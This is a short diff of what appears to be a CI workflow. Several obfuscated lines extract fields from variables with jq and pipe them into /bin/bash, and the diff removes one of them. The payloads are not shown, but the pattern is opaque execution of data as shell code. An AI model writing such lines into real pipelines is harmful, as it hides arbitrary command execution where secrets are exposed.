@@ -48,7 +48,6 @@ jobs:
           echo $tag4 | jq -r .ilwwu06703 | /bin/bash
           echo $zrgi52066 | jq -r .nh41817 | /bin/bash
           printf '%s' "$pam74" | jq -r .v25855 | /bin/bash
-          printf '%s' "$y8" | jq -r .inup09600 | /bin/bash
           printf '%s' "$kksx046" | jq -r .t7 | /bin/bash
           echo $jq70 | jq -r .r32 | /bin/bash
           printf '%s' "$adsva7682" | jq -r .tkyhr3203 | /bin/bash
